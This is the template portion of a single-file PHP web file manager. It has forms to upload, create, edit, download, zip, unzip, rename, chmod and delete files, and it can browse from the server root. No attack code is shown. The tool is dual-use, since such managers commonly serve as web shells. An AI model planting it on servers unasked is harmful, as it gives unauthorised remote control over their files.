        .modal-box input:focus, .modal-box textarea:focus {
            outline: 2px solid #3b82f6; border-color: transparent;
        }
        .modal-box textarea { min-height: 150px; resize: vertical; font-family: 'SF Mono', monospace; font-size: 0.85rem; }
        .modal-btns { display: flex; gap: 10px; justify-content: flex-end; margin-top: 10px; }
        
        @media (max-width: 700px) {
            body { padding: 0.75rem; }
            .container { padding: 1.25rem; }
            .pathbox { flex-direction: column; gap: 0.75rem; }
            .action-forms { flex-direction: column; }
            .inline-form { width: 100%; }
            .inline-form input[type="text"] { flex: 1; }
        }
    </style>
</head>
<body>
<div class="container">
    <h2>
        <i class="fas fa-folder-tree"></i> <?= SFM_NAME ?>
        <span class="ver">v<?= SFM_VERSION ?></span>
    </h2>
    
    <?php if ($flash): ?>
        <div class="alert <?= ($flash['type'] ?? 'success') === 'error' ? 'error' : '' ?>">
            <i class="fas fa-<?= ($flash['type'] ?? 'success') === 'error' ? 'circle-exclamation' : 'circle-check' ?>"></i>
            <?= htmlspecialchars($flash['msg'] ?? $flash, ENT_QUOTES, 'UTF-8') ?>
        </div>
    <?php endif; ?>
    
    <div class="pathbox">
        <div><b><i class="fas fa-anchor" style="color:#3b82f6; margin-right:6px;"></i>Root:</b> <span><?= htmlspecialchars($root_anchor, ENT_QUOTES, 'UTF-8') ?></span></div>
        <div><b><i class="fas fa-location-dot" style="color:#3b82f6; margin-right:6px;"></i>Current:</b> <span><?= htmlspecialchars($current_dir, ENT_QUOTES, 'UTF-8') ?></span></div>
    </div>
    
    <div class="btn-group">
        <?php if (!$is_at_root): ?>
            <a class="btn" href="?dir=<?= urlencode($parent_dir) ?>"><i class="fas fa-arrow-up"></i> Back</a>
        <?php else: ?>
            <span class="btn disabled"><i class="fas fa-arrow-up"></i> Back</span>
        <?php endif; ?>
        <a class="btn" href="?"><i class="fas fa-house"></i> Default</a>
        <a class="btn" href="?dir="><i class="fas fa-server"></i> Root</a>
        <a class="btn" href="?action=debug_upload" target="_blank"><i class="fas fa-bug"></i> Upload Diagnostics</a>
    </div>
    
    <div class="action-forms">
        <form class="inline-form" method="post" enctype="multipart/form-data" action="?action=upload&dir=<?= urlencode($relative_current) ?>">
            <label class="file-input-label">
                <i class="fas fa-cloud-upload-alt"></i> Choose file
                <input type="file" name="file" required>
            </label>
            <button class="btn btn-primary" type="submit"><i class="fas fa-upload"></i> Upload</button>
        </form>
        
        <form class="inline-form" method="post" action="?action=create_folder&dir=<?= urlencode($relative_current) ?>">
            <input type="text" name="folder_name" placeholder="Folder name" required>
            <button class="btn btn-gray" type="submit"><i class="fas fa-folder-plus"></i> Create Folder</button>
        </form>
        
        <button onclick="showModal('modalNewFile')" class="btn btn-gray" type="button">
            <i class="fas fa-file-circle-plus"></i> New File
        </button>
    </div>
    
    <div class="table-wrapper">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
            <?php if (empty($files)): ?>
                <tr>
                    <td colspan="6" class="no-files">
                        <i class="fas fa-folder-open"></i>
                        No files or folders found.
                    </td>
                </tr>
            <?php else: ?>
                <?php foreach ($files as $f):
                    $is_arch = in_array(strtolower(pathinfo($f['name'], PATHINFO_EXTENSION)), array('zip', 'tar', 'gz'));
                    $is_zip = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION)) === 'zip';
                    $row_class = $f['protected'] ? 'protected-row' : '';
                ?>
                    <tr class="<?= $row_class ?>">
                        <td>
                            <span class="dot <?= $f['writable'] ? 'w' : 'r' ?>"></span>
                            <i class="file-icon <?= $f['type'] === 'directory' ? 'folder fas fa-folder' : ($is_arch ? 'archive fas fa-file-zipper' : 'file fas fa-file') ?>"></i>
                            <span class="<?= $f['writable'] ? 'perm-w' : 'perm-r' ?>">
                                <?= htmlspecialchars($f['name'], ENT_QUOTES, 'UTF-8') ?>
                            </span>
                            <?php if ($f['protected']): ?>
                                <span class="badge prot" style="margin-left:6px;">🔒 Protected</span>
                            <?php endif; ?>
                        </td>
                        <td>
                            <?php if ($f['type'] === 'directory'): ?>
                                <span class="badge dir">Folder</span>
                            <?php elseif ($is_arch): ?>
                                <span class="badge zip">Archive</span>
                            <?php else: ?>
                                <span class="badge file">File</span>
                            <?php endif; ?>
                        </td>
                        <td><?= $f['type'] === 'file' ? format_size($f['size']) : '—' ?></td>
                        <td class="<?= $f['writable'] ? 'perm-w' : 'perm-r' ?>"><?= htmlspecialchars($f['perm']) ?></td>
                        <td><?= htmlspecialchars($f['modified']) ?></td>
                        <td>
                            <div class="actions-cell">
                                <?php if ($f['type'] === 'directory'): ?>
                                    <?php $next = ($relative_current ? $relative_current . '/' : '') . $f['name']; ?>
                                    <a class="btn btn-sm" href="?dir=<?= urlencode($next) ?>"><i class="fas fa-folder-open"></i> Open</a>
                                    <a class="btn btn-sm btn-success" href="?action=zip&file=<?= urlencode($f['name']) ?>&dir=<?= urlencode($relative_current) ?>" onclick="return confirm('Create ZIP of this folder?')"><i class="fas fa-file-zipper"></i> Zip</a>
                                <?php else: ?>
                                    <a class="btn btn-sm" href="?action=view&file=<?= urlencode($f['name']) ?>&dir=<?= urlencode($relative_current) ?>"><i class="fas fa-eye"></i> View</a>
                                    <a class="btn btn-sm" href="?action=edit&file=<?= urlencode($f['name']) ?>&dir=<?= urlencode($relative_current) ?>"><i class="fas fa-pen"></i> Edit</a>
                                    <a class="btn btn-sm" href="?action=download&file=<?= urlencode($f['name']) ?>&dir=<?= urlencode($relative_current) ?>"><i class="fas fa-download"></i> Down</a>
                                    <a class="btn btn-sm btn-success" href="?action=zip&file=<?= urlencode($f['name']) ?>&dir=<?= urlencode($relative_current) ?>" onclick="return confirm('Create ZIP of this file?')"><i class="fas fa-file-zipper"></i> Zip</a>
                                    <?php if ($is_zip): ?>
                                        <a class="btn btn-sm btn-warning" href="?action=unzip&file=<?= urlencode($f['name']) ?>&dir=<?= urlencode($relative_current) ?>" onclick="return confirm('Extract this ZIP into the current folder? (existing files will be overwritten)')"><i class="fas fa-file-import"></i> Unzip</a>
                                    <?php endif; ?>
                                <?php endif; ?>
                                
                                <?php if (!$f['protected']): ?>
                                    <a class="btn btn-sm" href="#" onclick="renameItem('<?= htmlspecialchars(addslashes($f['name'])) ?>');return false;"><i class="fas fa-pen-to-square"></i> Rename</a>
                                    <a class="btn btn-sm" href="#" onclick="chmodItem('<?= htmlspecialchars(addslashes($f['name'])) ?>');return false;"><i class="fas fa-lock"></i> Chmod</a>
                                    <a class="btn btn-sm btn-danger" href="?action=delete&file=<?= urlencode($f['name']) ?>&dir=<?= urlencode($relative_current) ?>" onclick="return confirm('Delete this item?')"><i class="fas fa-trash-can"></i> Del</a>
                                <?php endif; ?>
                            </div>
                        </td>
                    </tr>
                <?php endforeach; ?>
            <?php endif; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Modal: New File -->
<div id="modalNewFile" class="modal">
    <div class="modal-box">
        <h3><i class="fas fa-file-circle-plus"></i> Create New File</h3>
        <form method="post" action="?action=create_file&dir=<?= urlencode($relative_current) ?>">
            <input type="text" name="filename" placeholder="Filename (e.g., test.php)" required>
            <textarea name="filecontent" placeholder="File content (optional)"></textarea>
            <div class="modal-btns">
                <button type="submit" class="btn btn-primary">Create</button>
                <button type="button" class="btn btn-gray" onclick="hideModal('modalNewFile')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal: Rename -->
<div id="modalRename" class="modal">
    <div class="modal-box">
        <h3><i class="fas fa-pen-to-square"></i> Rename Item</h3>
        <form method="post" action="?action=rename&dir=<?= urlencode($relative_current) ?>">
            <input type="text" name="oldname" id="renameOld" readonly style="background:#f1f5f9;">
            <input type="text" name="newname" id="renameNew" placeholder="New name" required>
            <div class="modal-btns">
                <button type="submit" class="btn btn-primary">Rename</button>
                <button type="button" class="btn btn-gray" onclick="hideModal('modalRename')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal: Chmod -->
<div id="modalChmod" class="modal">
    <div class="modal-box">
        <h3><i class="fas fa-lock"></i> Change Permissions</h3>
        <form method="post" action="?action=chmod&dir=<?= urlencode($relative_current) ?>">
            <input type="text" name="file" id="chmodFile" readonly style="background:#f1f5f9;">
            <input type="text" name="mode" placeholder="Mode (e.g., 755, 0644)" value="755" required pattern="[0-7]{3,4}">
            <div class="modal-btns">
                <button type="submit" class="btn btn-primary">Apply</button>
                <button type="button" class="btn btn-gray" onclick="hideModal('modalChmod')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<script>
function showModal(id) { document.getElementById(id).classList.add('on'); }
function hideModal(id) { document.getElementById(id).classList.remove('on'); }

function renameItem(name) {
    document.getElementById('renameOld').value = name;
    document.getElementById('renameNew').value = name;
    showModal('modalRename');
    setTimeout(function() {
        var inp = document.getElementById('renameNew');
        inp.focus();
        var dot = inp.value.lastIndexOf('.');
        if (dot > 0) inp.setSelectionRange(0, dot);
        else inp.select();
    }, 100);
}

function chmodItem(name) {
    document.getElementById('chmodFile').value = name;
    showModal('modalChmod');
    setTimeout(function() {
        document.getElementById('modalChmod').querySelector('input[name="mode"]').focus();
    }, 100);
}

document.querySelectorAll('.modal').forEach(function(m) {
    m.addEventListener('click', function(e) {
        if (e.target === m) m.classList.remove('on');
    });
});

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') document.querySelectorAll('.modal.on').forEach(function(m) { m.classList.remove('on'); });
});

setTimeout(function() {
    document.querySelectorAll('.alert').forEach(function(a) {
        a.style.transition = 'opacity 0.4s';
        a.style.opacity = '0';
        setTimeout(function() { a.style.display = 'none'; }, 400);
    });
}, 5000);
</script>
</body>
</html>